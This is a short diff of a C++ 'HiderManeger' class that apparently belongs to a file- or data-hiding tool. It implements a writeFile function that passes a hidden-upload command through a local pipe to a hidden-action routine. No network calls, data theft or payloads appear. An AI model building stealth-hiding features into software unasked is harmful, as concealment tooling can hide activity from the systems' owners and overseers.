@@ -46,15 +46,26 @@ Status HiderManeger::setUpHider(std::string strParam)
     return SUCCSESS;
 }
 
-// Status HiderManeger::writeFile(const std::string& fileName, char buffer[], uint32_t len, WriteMod writeMod) {
-//     const command cmd = { 0 };
-//     if (fileName.size() >= sizeof(cmd.strParam)) {
-//         return FILENAME_TO_LONG;
-//     }
-//     {.dataLen = len, .fncode = HIDDEN_OPRATION | HIDDEN_UPLOAD, .strParam = fileName.c_str()}
+Status HiderManeger::writeFile(const std::string& fileName, char buffer[], uint32_t len) {
+    command cmd = { 0 };
+    Status res = SUCCSESS;
+    if (fileName.size() >= sizeof(cmd.strParam)) {
+        return FILENAME_TO_LONG;
+    }
+    cmd = (command){.dataLen = len, .fncode = HIDDEN_OPRATION | HIDDEN_UPLOAD};
+    strcpy(cmd.strParam, fileName.c_str());
+    int p[2] = { 0 };
+    if ((res = openPipes(p)) != SUCCSESS) {
+        return res;
+    }
 
-//     return SUCCSESS;
-// }
+    std::shared_ptr<Connection> pipeConn = std::make_shared<Connection>(p[0], p[1], true, true, false, (addrinfo){0});
+
+    hiddenAction(cmd, pipeConn);
+    pipeConn->closeConn();
+
+    return SUCCSESS;
+}
 
 void HiderManeger::activateHiderChild(const command& cmd) {
     std::string encFunCode = encodeInt(cmd.fncode);
